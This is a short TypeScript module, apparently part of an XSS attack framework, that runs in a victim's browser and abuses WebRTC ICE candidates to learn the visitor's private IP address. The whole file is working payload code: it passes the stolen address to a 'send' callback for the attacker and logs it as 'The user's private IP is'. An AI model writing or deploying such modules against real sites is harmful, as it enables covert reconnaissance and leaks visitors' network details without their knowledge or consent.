import { XSSModule } from '../types/index.js';

export const ipAddressModule: XSSModule = {
  name: 'IP Address',
  description: 'Gets local IP by abusing WebRTC.',
  
  execute: (send) => {
    // based on https://stackoverflow.com/a/32838936
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    
    pc.onicecandidate = function(ice) {
      if (!ice || !ice.candidate || !ice.candidate.candidate) return;
      const ip = ice.candidate.candidate.split(' ')[4];
      send(ip);
    };
  },
  
  handleResult: (log, data) => {
    log("The user's private IP is: " + data);
  }
};

export default ipAddressModule;